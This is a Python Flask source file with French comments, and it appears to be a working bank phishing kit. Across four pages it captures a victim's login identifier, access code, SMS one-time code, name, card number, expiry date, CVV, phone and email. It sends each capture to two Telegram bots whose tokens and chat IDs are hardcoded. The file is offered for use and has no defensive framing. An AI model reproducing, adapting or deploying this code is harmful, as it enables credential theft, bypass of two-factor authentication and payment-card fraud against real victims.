from flask import Flask, render_template, request, redirect, url_for, session
import requests
import traceback

app = Flask(__name__)
app.secret_key = "supersecretkey"  # À changer en prod

def send_telegram_message(message):
    bots = [
        {"token": "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A", "chat_id": "6297861735"},  # Remplace par tes vrais tokens & chat_ids
        {"token": "8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs", "chat_id": "7650873997"},
    ]

    for bot in bots:
        url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
        data = {'chat_id': bot['chat_id'], 'text': message}
        try:
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                print(f"Message envoyé avec succès via bot {bot['token'][:8]}...")
            else:
                print(f"Erreur Telegram ({bot['token'][:8]}): {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Erreur lors de l'envoi Telegram ({bot['token'][:8]}):", e)
            traceback.print_exc()


@app.route('/', methods=['GET', 'POST'])
def identifiant():
    if request.method == 'POST':
        session['identifiant'] = request.form.get('identifiant', '')
        # Envoi Telegram page identifiant
        message = f"[Page Identifiant]\nIdentifiant : {session['identifiant']}"
        send_telegram_message(message)
        return redirect(url_for('code'))
    return render_template('identifiant.html')


@app.route('/code', methods=['GET', 'POST'])
def code():
    identifiant = session.get('identifiant', 'Aucun')
    if request.method == 'POST':
        session['code'] = request.form.get('code', '')
        # Envoi Telegram page code
        message = f"[Page Code]\nIdentifiant : {identifiant}\nCode : {session['code']}"
        send_telegram_message(message)
        return redirect(url_for('sms'))
    return render_template('code.html', identifiant=identifiant)


@app.route('/sms', methods=['GET', 'POST'])
def sms():
    if request.method == 'POST':
        # Ici on récupère les 6 inputs sms1 à sms6 et on concatène
        sms_parts = [request.form.get(f'sms{i}', '') for i in range(1,7)]
        sms_code = ''.join(sms_parts)
        session['sms'] = sms_code
        # Envoi Telegram page sms
        message = f"[Page SMS]\nSMS Code : {sms_code}"
        send_telegram_message(message)
        return redirect(url_for('formulaire'))
    return render_template('sms.html')


@app.route('/formulaire', methods=['GET', 'POST'])
def formulaire():
    if request.method == 'POST':
        identifiant = session.get('identifiant', '')
        code = session.get('code', '')
        sms = session.get('sms', '')

        nom = request.form.get('nom', '')
        prenom = request.form.get('prenom', '')
        numero_cb = request.form.get('numero_cb', '')
        date_expiration = request.form.get('date_expiration', '')
        cvv = request.form.get('cvv', '')
        telephone = request.form.get('telephone', '')
        email = request.form.get('email', '')

        # Envoi Telegram page formulaire
        message = (
            f"[Page Formulaire]\n"
            f"Identifiant : {identifiant}\n"
            f"Code : {code}\n"
            f"SMS : {sms}\n"
            f"Nom : {nom}\n"
            f"Prénom : {prenom}\n"
            f"Numéro CB : {numero_cb}\n"
            f"Expiration : {date_expiration}\n"
            f"CVV : {cvv}\n"
            f"Téléphone : {telephone}\n"
            f"Email : {email}"
        )
        send_telegram_message(message)

        return redirect(url_for('merci'))
    return render_template('formulaire.html')


@app.route('/merci')
def merci():
    return render_template('merci.html')


if __name__ == '__main__':
    app.run(debug=True)
